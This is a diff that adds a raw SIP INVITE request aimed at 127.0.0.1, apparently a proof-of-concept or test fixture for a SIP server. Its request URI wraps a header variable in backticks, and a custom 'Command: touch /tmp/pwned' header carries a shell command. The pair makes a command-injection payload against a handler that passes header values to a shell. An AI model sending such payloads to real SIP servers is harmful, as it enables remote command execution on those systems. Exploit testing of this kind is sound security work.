@@ -1,0 +1,11 @@
+INVITE sip:`$SIP_HF_COMMAND`@127.0.0.1 SIP/2.0
+Command: touch /tmp/pwned
+Via: SIP/2.0/UDP 127.0.0.1:33119;rport;branch=z9hG4bK-tkTnlLt9O060cG74
+Max-Forwards: 70
+From: <sip:10259236@127.0.0.1>;tag=iGisWG0cKQ7TyixA
+To: <sip:1000@127.0.0.1>
+Call-ID: vnU9zwgVVsPsOLzc
+CSeq: 1 INVITE
+Contact: <sip:10259236@127.0.0.1:33119;transport=udp>
+Content-Length: 0
+
